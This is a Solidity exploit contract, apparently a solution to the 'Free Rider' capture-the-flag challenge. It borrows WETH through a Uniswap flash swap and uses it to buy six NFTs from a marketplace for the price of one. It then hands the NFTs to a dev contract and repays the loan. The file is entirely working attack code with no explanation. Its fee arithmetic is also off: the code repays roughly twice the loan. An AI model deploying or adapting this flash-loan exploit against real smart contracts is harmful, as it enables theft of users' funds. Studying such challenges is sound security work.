// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address);
}

interface IWETH {
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    IERC721 private immutable nft;
    address private immutable devContract;
    address payable private immutable marketplaceAddress;
    uint256[] private ids;
    IUniswapV2Pair private immutable uniswapPair;
    IWETH private immutable weth;
    address private player;

    constructor(
        address _nftAddress,
        address _devContract,
        address payable _marketplaceAddress,
        uint256[] memory _ids,
        IUniswapV2Pair _uniswapPair,
        IWETH _weth,
        address _player
    ) {
        nft = IERC721(_nftAddress);
        devContract = _devContract;
        marketplaceAddress = _marketplaceAddress;
        ids = _ids;
        uniswapPair = _uniswapPair;
        weth = _weth;
        player = _player;
    }

    function attack() external {
        uniswapPair.swap(15 ether, 0, address(this), hex"00");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(15 ether);

        FreeRiderNFTMarketplace(marketplaceAddress).buyMany{value: 15 ether}(
            ids
        );
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), devContract, tokenId, abi.encode(player));
        }

        // Calculate fee and pay back loan.
        uint256 fee = ((15 ether * 1000) / uint256(997)) + 1;
        weth.deposit{value: 15 ether + fee}();
        weth.transfer(address(uniswapPair), 15 ether + fee);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
